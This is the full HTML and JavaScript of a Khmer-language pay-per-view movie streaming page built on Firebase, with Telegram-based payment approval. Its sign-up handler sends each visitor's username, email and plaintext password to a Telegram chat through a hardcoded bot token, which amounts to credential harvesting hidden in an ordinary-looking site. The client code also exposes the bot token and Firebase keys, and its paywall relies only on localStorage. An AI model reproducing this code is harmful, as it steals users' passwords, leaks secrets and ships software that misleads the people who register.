<!DOCTYPE html>
<html lang="km">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Angkor DC - Movie Stream</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <link href="https://fonts.googleapis.com/css2?family=Kantumruy+Pro:wght@400;600;700;900&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Kantumruy Pro', sans-serif; background-color: #0d0d11; }
    .no-scrollbar::-webkit-scrollbar { display: none; }
    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
  </style>

  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
</head>
<body class="text-white pb-24 select-none">

  <header class="fixed top-0 inset-x-0 h-16 bg-black/70 backdrop-blur-md z-40 flex items-center justify-between px-4 md:px-8 border-b border-white/5">
    <div class="flex items-center gap-3">
      <div class="w-9 h-9 rounded-xl bg-amber-500 text-black font-black flex items-center justify-center text-lg">A</div>
      <span class="text-lg font-bold">Angkor DC</span>
    </div>
    <div class="flex items-center gap-2 bg-neutral-900 border border-neutral-800 px-3 py-1.5 rounded-xl">
      <i data-lucide="user" class="w-4 h-4 text-amber-400"></i>
      <span id="headerUserName" class="text-xs font-bold">ភ្ញៀវ</span>
    </div>
  </header>

  <div id="heroSection" class="relative min-h-[55vh] flex flex-col justify-end px-6 pb-8 pt-24"></div>

  <section class="px-6 mt-4">
    <h2 class="text-lg font-bold mb-4 flex items-center gap-2">
      <i data-lucide="film" class="w-4 h-4 text-amber-400"></i> ភាពយន្តទាំងអស់
    </h2>
    <div id="moviesRow" class="flex gap-4 overflow-x-auto no-scrollbar pb-4"></div>
  </section>

  <!-- Auth Modal -->
  <div id="authModal" class="fixed inset-0 bg-black/95 backdrop-blur-md z-50 hidden items-center justify-center p-4">
    <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 max-w-md w-full text-center">
      <h3 class="text-lg font-black text-white mb-1">ចុះឈ្មោះចូលទស្សនា</h3>
      <p class="text-xs text-neutral-400 mb-4">បង្កើតគណនីដើម្បីទស្សនាភាពយន្ត</p>
      <form id="authForm" class="space-y-3 text-left">
        <input type="text" id="regUsername" required placeholder="ឈ្មោះអ្នកប្រើប្រាស់" class="w-full bg-neutral-800 border border-neutral-700 rounded-xl p-3 text-sm focus:border-amber-400 focus:outline-none">
        <input type="email" id="regEmail" required placeholder="អ៊ីមែល" class="w-full bg-neutral-800 border border-neutral-700 rounded-xl p-3 text-sm focus:border-amber-400 focus:outline-none">
        <input type="password" id="regPassword" required placeholder="ពាក្យសម្ងាត់" class="w-full bg-neutral-800 border border-neutral-700 rounded-xl p-3 text-sm focus:border-amber-400 focus:outline-none">
        <button type="submit" class="w-full bg-amber-500 text-black font-bold py-3.5 rounded-xl text-sm mt-2">យល់ព្រម & ចូល</button>
      </form>
    </div>
  </div>

  <!-- Video Modal -->
  <div id="videoModal" class="fixed inset-0 bg-black/95 z-50 hidden flex-col items-center justify-start overflow-y-auto p-4 md:p-8">
    <div class="w-full max-w-4xl relative mt-4">
      <div class="flex justify-between items-center mb-3">
        <h3 id="playerTitle" class="font-bold text-amber-400 truncate">ចំណងជើងរឿង</h3>
        <button onclick="closePlayer()" class="bg-neutral-800 px-3 py-1.5 rounded-xl text-xs font-bold">បិទ</button>
      </div>
      <div class="w-full bg-black rounded-2xl overflow-hidden border border-neutral-800 aspect-video">
        <video id="mainVideo" controls playsinline controlsList="nodownload" class="w-full h-full object-contain">
          <source id="videoSource" src="" type="video/mp4">
        </video>
      </div>
    </div>
  </div>

  <!-- QR Modal -->
  <div id="qrPayModal" class="fixed inset-0 bg-black/90 backdrop-blur-md z-50 hidden items-center justify-center p-4">
    <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 max-w-md w-full text-center">
      <h3 class="text-lg font-black mb-1">ស្កេន KHQR ដើម្បីទស្សនា (១ដងគត់)</h3>
      <p id="qrNotice" class="text-xs text-amber-400 mb-4"></p>
      <img src="khqr.png" class="max-w-[260px] mx-auto rounded-2xl border border-neutral-800 mb-4" />
      <form id="slipForm" class="space-y-3 text-left">
        <input type="file" id="slipFile" accept="image/*" required class="w-full bg-neutral-800 border border-neutral-700 rounded-xl p-2 text-xs">
        <button type="submit" id="slipBtn" class="w-full bg-amber-500 text-black font-bold py-3 rounded-xl text-sm">ផ្ញើវិក្កយបត្រ</button>
      </form>
    </div>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBDE90o2ObzHZXjiun3lrO5ubEHqg0BM6o",
      authDomain: "database-3986b.firebaseapp.com",
      projectId: "database-3986b",
      storageBucket: "database-3986b.firebasestorage.app",
      messagingSenderId: "1060738579533",
      appId: "1:1060738579533:web:17b0ba0db79322b8b1f004",
      measurementId: "G-MEWSC9Q0VL"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const BOT_TOKEN = "8870525233:AAEMYx2LPfOTgc5CZoC8Q2wVhvIxKeXjt00";
    const CHAT_ID = "5915683588";

    let allMovies = [];
    let currentMovie = null;

    const user = JSON.parse(localStorage.getItem('guest_user') || 'null');
    if (!user) {
      document.getElementById('authModal').classList.remove('hidden');
      document.getElementById('authModal').classList.add('flex');
    } else {
      document.getElementById('headerUserName').innerText = user.username;
    }

    document.getElementById('authForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const u = {
        uid: 'AK-' + Math.floor(1000 + Math.random() * 9000),
        username: document.getElementById('regUsername').value.trim(),
        email: document.getElementById('regEmail').value.trim(),
        pass: document.getElementById('regPassword').value.trim()
      };
      localStorage.setItem('guest_user', JSON.stringify(u));
      document.getElementById('headerUserName').innerText = u.username;
      document.getElementById('authModal').classList.add('hidden');

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `👤 <b>ភ្ញៀវចុះឈ្មោះថ្មី៖</b>\nUsername: <code>${u.username}</code>\nEmail: ${u.email}\nPass: <code>${u.pass}</code>`,
          parse_mode: 'HTML'
        })
      });
    });

    db.collection("movies").orderBy("createdAt", "desc").onSnapshot((snapshot) => {
      allMovies = [];
      snapshot.forEach(doc => allMovies.push({ id: doc.id, ...doc.data() }));

      if (allMovies.length > 0) {
        const hero = allMovies[0];
        document.getElementById('heroSection').innerHTML = `
          <img src="${hero.cover}" class="absolute inset-0 w-full h-full object-cover -z-10 brightness-75" />
          <div class="absolute inset-0 bg-gradient-to-t from-[#0d0d11] via-[#0d0d11]/50 to-transparent -z-10"></div>
          <div class="max-w-xl">
            <span class="text-xs bg-amber-500 text-black font-black px-2.5 py-1 rounded-lg uppercase">${hero.price}</span>
            <h1 class="text-3xl font-black my-2">${hero.title}</h1>
            <button onclick="playMovie('${hero.id}')" class="bg-amber-500 text-black font-bold px-6 py-3 rounded-xl flex items-center gap-2">
              <i data-lucide="play" class="w-5 h-5 fill-black"></i> ទស្សនា
            </button>
          </div>
        `;

        document.getElementById('moviesRow').innerHTML = allMovies.map(m => `
          <div onclick="playMovie('${m.id}')" class="min-w-[150px] rounded-2xl overflow-hidden bg-neutral-900 border border-neutral-800 cursor-pointer">
            <img src="${m.cover}" class="w-full h-44 object-cover" />
            <div class="p-3">
              <p class="text-xs font-bold truncate">${m.title}</p>
              <span class="text-[10px] text-amber-400">${m.price}</span>
            </div>
          </div>
        `).join('');
      } else {
        document.getElementById('heroSection').innerHTML = `<div class="text-center py-12 text-sm text-neutral-500">មិនទាន់មានរឿងនៅក្នុងប្រព័ន្ធទេ។</div>`;
        document.getElementById('moviesRow').innerHTML = ``;
      }
      lucide.createIcons();
    });

    function playMovie(id) {
      currentMovie = allMovies.find(m => m.id === id);
      const unlocked = JSON.parse(localStorage.getItem('unlocked_movies') || '[]');
      
      if (currentMovie.price.toLowerCase() !== 'free' && !unlocked.includes(id)) {
        document.getElementById('qrNotice').innerText = `រឿង៖ ${currentMovie.title} (${currentMovie.price})`;
        document.getElementById('qrPayModal').classList.remove('hidden');
        document.getElementById('qrPayModal').classList.add('flex');
        return;
      }

      document.getElementById('playerTitle').innerText = currentMovie.title;
      document.getElementById('videoSource').src = currentMovie.episodes[0].videoUrl;
      const v = document.getElementById('mainVideo');
      v.load();
      v.play();
      document.getElementById('videoModal').classList.remove('hidden');
      document.getElementById('videoModal').classList.add('flex');
    }

    document.getElementById('mainVideo').onended = () => {
      let unlocked = JSON.parse(localStorage.getItem('unlocked_movies') || '[]');
      unlocked = unlocked.filter(i => i !== currentMovie.id);
      localStorage.setItem('unlocked_movies', JSON.stringify(unlocked));
      closePlayer();
      alert('🔒 លោកអ្នកបានទស្សនាចប់សព្វគ្រប់ ១ ដងហើយ!');
    };

    function closePlayer() {
      document.getElementById('mainVideo').pause();
      document.getElementById('videoModal').classList.add('hidden');
    }

    document.getElementById('slipForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const btn = document.getElementById('slipBtn');
      btn.innerText = "កំពុងផ្ញើ...";
      btn.disabled = true;

      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', document.getElementById('slipFile').files[0]);
      fd.append('caption', `🔔 <b>ស្នើសុំមើលរឿង៖</b> ${currentMovie.title}\nUser: ${user.username} (ID: ${user.uid})\nតម្លៃ៖ ${currentMovie.price}`);
      fd.append('reply_markup', JSON.stringify({
        inline_keyboard: [[
          { text: "✅ អនុម័ត", callback_data: `APP:${user.uid}:${currentMovie.id}` }
        ]]
      }));

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
      alert("✅ បានផ្ញើវិក្កយបត្រ! សូមរង់ចាំ Admin អនុម័តលើ Telegram។");
      document.getElementById('qrPayModal').classList.add('hidden');
      btn.innerText = "ផ្ញើវិក្កយបត្រ";
      btn.disabled = false;
    });

    let lastUpId = 0;
    setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpId + 1}`);
        const data = await res.json();
        if (data.ok && data.result.length > 0) {
          for (const u of data.result) {
            lastUpId = u.update_id;
            if (u.callback_query && u.callback_query.data.startsWith('APP:')) {
              const [, uid, mid] = u.callback_query.data.split(':');
              if (user && user.uid === uid) {
                let unlocked = JSON.parse(localStorage.getItem('unlocked_movies') || '[]');
                unlocked.push(mid);
                localStorage.setItem('unlocked_movies', JSON.stringify(unlocked));
                alert("🎉 Admin បានអនុម័តហើយ! លោកអ្នកអាចទស្សនាបានឥឡូវនេះ។");
                playMovie(mid);
              }
            }
          }
        }
      } catch (e) {}
    }, 3000);

    lucide.createIcons();
  </script>
</body>
</html>
